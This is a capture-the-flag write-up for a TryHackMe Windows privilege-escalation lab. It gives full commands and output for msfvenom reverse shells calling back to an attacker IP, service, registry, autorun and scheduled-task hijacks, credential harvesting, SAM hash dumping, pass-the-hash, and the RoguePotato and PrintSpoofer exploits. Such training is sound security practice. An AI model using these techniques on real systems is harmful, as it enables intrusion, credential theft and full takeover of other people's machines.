# Windows PrivEsc

URL: https://tryhackme.com/room/windows10privesc

Level: Medium

Date: 30 Jul 2023

- [Reverse shell](#reverse-shell)
- [Service Exploits - Insecure Service Permissions](#insecure-service-permissions)
- [Service Exploits - Unquoted Service Path](#unquoted-service-path)
- [Service Exploits - Weak Registry Permissions](#weak-registry-permissions)
- [Service Exploits - Insecure Service Executables](#insecure-service-executables)
- [Registry - AutoRuns](#autoruns)
- [Registry - AlwaysInstallElevated](#alwaysinstalledelevated)
- [Passwords - Registry](#passwords-registry)
- [Passwords - Saved Creds](#passwords-saved-creds)
- [Passwords - Security Account Manager (SAM)](#security-account-manager)
- [Passwords - Passing the Hash](#pass-the-hash)
- [Scheduled Tasks](#scheduled-tasks)
- [Insecure GUI Apps](#insecure-gui-apps)
- [Startup Apps](#startup-apps)
- [Token Impersonation - Rogue Potato](#rogue-potato)
- [Token Impersonation - PrintSpoofer](#printspoofer)

## Reverse shell

Generate payload with `msfvenom`:

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.100.14 LPORT=4444 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

Spawn a SMB server (share "kali"):

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
[sudo] password for joshua:
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
```

From target machine, copy file:

```
C:\Users\user>copy \\10.8.100.14\kali\reverse.exe c:\privesc\reverse.exe
        1 file(s) copied.
```

Spawn netcat listener:

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ nc -nvlp 4444
listening on [any] 4444 ...
```

Launch exe:

```
C:\Users\user>c:\privesc\reverse.exe

C:\Users\user>
```

Enjoy your shell:

```bash
connect to [10.8.100.14] from (UNKNOWN) [10.10.174.134] 49729
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\user>whoami
whoami
win-qba94kb3iof\user

C:\Users\user>
```


## insecure service permissions


Note: `accesschk.exe` is part of Sysinternals Suite:

https://learn.microsoft.com/it-it/sysinternals/

Let's check service "daclsvc":

```bash
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL
```

`-u` : Suppress errors
`-w`: Show only objects that have write access
`-c`: Name is a Windows Service, e.g. `ssdpsrv`. Specify `"*"` as the name to show all services and `scmanager` to check the security of the Service Control Manager.
`-q`: Omit Banner
`-v`: Verbose (includes Windows Vista Integrity Level)
`user`: is literally the account name on which we would like to check privileges

reference:

https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk

So far we have `SERVICE_CHANGE_CONFIG` permission, we are able to modify service "daclsvc".

Let's investigate further `dacslsvc`:

```
C:\Users\user>sc qc daclsvc
sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

**NOTE** that service is running as SYSTEM.

Let's modify `binpath`:

```
C:\Users\user>sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
[SC] ChangeServiceConfig SUCCESS
```

Let's start our forged service:

```
C:\Users\user>net start daclsvc
```

We should now receive a SYSTEM shell:

```bash
connect to [10.8.100.14] from (UNKNOWN) [10.10.174.134] 49800
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

## unquoted service path

Check `unquotedsvc`

```
C:\Users\user>sc qc unquotedsvc
sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Let's check if we have write access to path:

`C:\Program Files\Unquoted Path Service\Common Files\`

```
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators

C:\Users\user>
```

Let's note that `BUILTIN\Users` have write access.

Copy our reverse shell payload to path:

```
C:\Users\user>copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
        1 file(s) copied.
```

Start service:

```
C:\Users\user>net start unquotedsvc
```

Enjoy our shell:

```bash
connect to [10.8.100.14] from (UNKNOWN) [10.10.174.134] 49830
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

## weak registry permissions

Let's investigate `regsvc` service:

```bash
C:\Users\user>sc qc regsvc
sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

It is running as SYSTEM.

Using `accesschk.exe`, note that the registry entry for the regsvc service is writable by the `NT AUTHORITY\INTERACTIVE` group (essentially all logged-on users):

```
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        KEY_ALL_ACCESS
  RW BUILTIN\Administrators
        KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS
```

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

```
C:\Users\user>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
The operation completed successfully.
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.174.134] 49850
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```



## insecure service executables

Query the "filepermsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME)

```bash
C:\Users\user>sc qc filepermsvc
sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

```bash
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

```bash
C:\Users\user>copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
        1 file(s) copied.
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:


```
C:\Users\user>net start filepermsvc
```

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.174.134] 49862
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## autoruns

Query the registry for AutoRun executables:

```bash
C:\Users\user>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```

Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:

```bash
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:

```
C:\Users\user>copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
        1 file(s) copied.
```

Start a listener and reboot target machine

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.174.134] 49685
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## AlwaysInstalledElevated

Query the registry for AlwaysInstallElevated keys:

```bash
C:\Users\user>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Users\user>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Note that both keys are set to 1 (0x1).

On Kali, generate a reverse shell Windows Installer (reverse.msi) using `msfvenom`. 
Update the LHOST IP address accordingly:

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.100.14 LPORT=5555 -f msi -o reverse.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse.msi
```

Spawn an SMB server on our attacker machine

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
[sudo] password for joshua:
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Copy our file to target:

```
C:\Users\user>copy \\10.8.100.14\kali\reverse.msi .
        1 file(s) copied.

C:\Users\user>
```

Start a listener on attacker:

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ nc -nvlp 5555
listening on [any] 5555 ...
```

On target, let's install malicious exe:

```
C:\Users\user>msiexec /quiet /qn /i reverse.msi

C:\Users\user>
```

Enjoy our shell:

```bash
connect to [10.8.100.14] from (UNKNOWN) [10.10.174.134] 49746
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```


## passwords registry

The registry can be searched for keys and values that contain the word "password":

```bash
C:\Users\user>reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0fafd998-c8e8-42a1-86d7-7c10c664a415}
    (Default)    REG_SZ    Picture Password Enrollment UX

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}
    (Default)    REG_SZ    PicturePasswordLogonProvider
..
..
..
..
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
    Password    REG_SZ

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

End of search: 258 match(es) found.

```

To save time:

```bash
C:\Users\user>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ
    DefaultUserName    REG_SZ    admin
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x4d06eebbf
    ShutdownFlags    REG_DWORD    0x80000027
    AutoAdminLogon    REG_SZ    0
    AutoLogonSID    REG_SZ    S-1-5-21-3025105784-3259396213-1915610826-1001
    LastUsedUsername    REG_SZ    admin
	DefaultPassword     REG_SZ    password123
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AlternateShells
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\GPExtensions
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\UserDefaults
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon\VolatileUserMgrKey

```


**NOTE**

```
LastUsedUsername    REG_SZ    admin
DefaultPassword    REG_SZ    password123
```

Once we get password, from our attacker machine, let's spawn a CMD shell:

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ winexe -U 'admin%password123' //10.10.174.134 cmd.exe
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>
```

## passwords saved creds

Check if there are saved passwords around

```bash
C:\Users\user>cmdkey /list
cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02nfpgrklkitqatu
    Local machine persistence

    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin
```

We do have `admin` credentials saved here!

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:

```
C:\Users\user>runas /savecred /user:admin C:\PrivEsc\reverse.exe
Attempting to start C:\PrivEsc\reverse.exe as user "WIN-QBA94KB3IOF\admin" ...
```

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.174.134] 49790
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## security account manager

The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the `C:\Windows\Repair\` directory.

Let's spawn an SMB server on our attacker machine:

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
[sudo] password for joshua:
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Copy `SAM` and `SYSTEM` files:

```
C:\Users\user>copy c:\Windows\Repair\SAM \\10.8.100.14\kali\
        1 file(s) copied.

C:\Users\user>copy c:\Windows\Repair\SYSTEM \\10.8.100.14\kali\
        1 file(s) copied.

C:\Users\user>
```

Let's clone on our attacker machine `creddump7`

```bash
joshua@kaligra:/opt/tools$ git clone https://github.com/Tib3rius/creddump7
Cloning into 'creddump7'...
remote: Enumerating objects: 107, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 107 (delta 0), reused 1 (delta 0), pack-reused 102
Receiving objects: 100% (107/107), 51.65 KiB | 944.00 KiB/s, done.
Resolving deltas: 100% (55/55), done.
```

If we get error:

```python
joshua@kaligra:/opt/tools$ python3 creddump7/pwdump.py SYSTEM SAM
Traceback (most recent call last):
  File "/opt/tools/creddump7/pwdump.py", line 31, in <module>
    dump_file_hashes(sys.argv[1], sys.argv[2])
  File "/opt/tools/creddump7/framework/win32/hashdump.py", line 311, in dump_file_hashes
    dump_hashes(sysaddr, samaddr)
  File "/opt/tools/creddump7/framework/win32/hashdump.py", line 293, in dump_hashes
    hbootkey = get_hbootkey(samaddr, bootkey)
  File "/opt/tools/creddump7/framework/win32/hashdump.py", line 177, in get_hbootkey
    cipher = AES.new(bootkey, AES.MODE_CBC, iv)
  File "/home/joshua/.local/lib/python3.10/site-packages/Crypto/Cipher/AES.py", line 95, in new
    return AESCipher(key, *args, **kwargs)
  File "/home/joshua/.local/lib/python3.10/site-packages/Crypto/Cipher/AES.py", line 59, in __init__
    blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
  File "/home/joshua/.local/lib/python3.10/site-packages/Crypto/Cipher/blockalgo.py", line 141, in __init__
    self._cipher = factory.new(key, *args, **kwargs)
SystemError: PY_SSIZE_T_CLEAN macro must be defined for '#' formats
```

Let's change library:

```bash
joshua@kaligra:/opt/tools$ pip3 install pycryptodome
Defaulting to user installation because normal site-packages is not writeable
Collecting pycryptodome
  Downloading pycryptodome-3.18.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.1/2.1 MB 9.9 MB/s eta 0:00:00
Installing collected packages: pycryptodome
Successfully installed pycryptodome-3.18.0
```

Now we can extract hashes:

```bash
joshua@kaligra:/opt/tools$ python3 creddump7/pwdump.py SYSTEM SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```

## pass the hash

Once we get password hashes, we can access remotely with `pth-winexe`:

```bash
joshua@kaligra:/opt/tools$ pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.96.135 cmd.exe
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
win-qba94kb3iof\admin

C:\Windows\system32>
```

## scheduled tasks

Let's assume there is a powershell script that runs as scheduled task: `C:\DevTools\CleanUp.ps1`


Let's check privileges:

```
C:\Windows\system32>C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
RW C:\DevTools\CleanUp.ps1
        FILE_ADD_FILE
        FILE_ADD_SUBDIRECTORY
        FILE_APPEND_DATA
        FILE_EXECUTE
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        DELETE
        SYNCHRONIZE
        READ_CONTROL

```

We have permission to append data to this file.

Let's append a call to our malicious reverse shell:

```
C:\Windows\system32>echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

After a while:

```bash
joshua@kaligra:~/Documents/thm/windows10privesc$ nc -nlvp 4444                  listening on [any] 4444 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.96.135] 49747
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```


## Insecure GUI apps

Some apps could run insecurely (with high privileges), eg.

```bash
tasklist /V | findstr mspaint.exe
tasklist /V | findstr mspaint.exe
mspaint.exe                   5096 RDP-Tcp#1                  2     29,140 K Unknown         WIN-QBA94KB3IOF\admin                                   0:00:00 N/A
```

this means that we can open `cmd.exe` with elevated privileges:

![](Pasted%20image%2020230731125743.png)

**NOTE** correct path should be: `file://c:\windows\system32\cmd.exe`

![](Pasted%20image%2020230731125925.png)

## startup apps

Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:

```bash
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW WIN-QBA94KB3IOF\Administrator
  RW WIN-QBA94KB3IOF\admin
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  Everyone
```

This script will create a shortcut for our malicious `reverse.exe` file:

```bash
C:\Windows\system32>type C:\PrivEsc\CreateShortcut.vbs
type C:\PrivEsc\CreateShortcut.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

```
C:\Users\user>cscript C:\PrivEsc\CreateShortcut.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.


C:\Users\user>
```

Once an user will access system through RDP, we should get our reverse shell

```bash
joshua@kaligra:/opt/tools$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.96.135] 49834
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

## rogue potato

Start a listener on port 135 with `socat` on our attacker machine:

```bash
joshua@kaligra:/opt/tools$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.96.135:9999
[sudo] password for joshua:
```

Start another listener on port 4444/tcp and launch our malicious `reverse.exe` while logged in as `admin` user:

![](Pasted%20image%2020230731131648.png)

We receive our shell al `local service`

```bash
connect to [10.8.100.14] from (UNKNOWN) [10.10.96.135] 49919
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>
```

In this session, use `RoguePotato` exploit:

```bash
C:\Windows\system32>C:\PrivEsc\RoguePotato.exe -r 10.8.100.14 -e "C:\PrivEsc\rev                                                              erse.exe" -l 9999
C:\PrivEsc\RoguePotato.exe -r 10.8.100.14 -e "C:\PrivEsc\reverse.exe" -l 9999

[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to                                                               connect
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-332836                                                              6b9097}
[*] IStoragetrigger written:104 bytes
[*] SecurityCallback RPC call
[*] ServerAlive2 RPC Call
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pip                                                              e/RoguePotato[\pipe\epmapper]
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching:                                                               C:\PrivEsc\reverse.exe
[+] RoguePotato gave you the SYSTEM powerz :D

C:\Windows\system32>
C:\Windows\system32>whoami
whoami
nt authority\local service

C:\Windows\system32>
```

## printspoofer

Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:

```bash
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

```bash
C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```



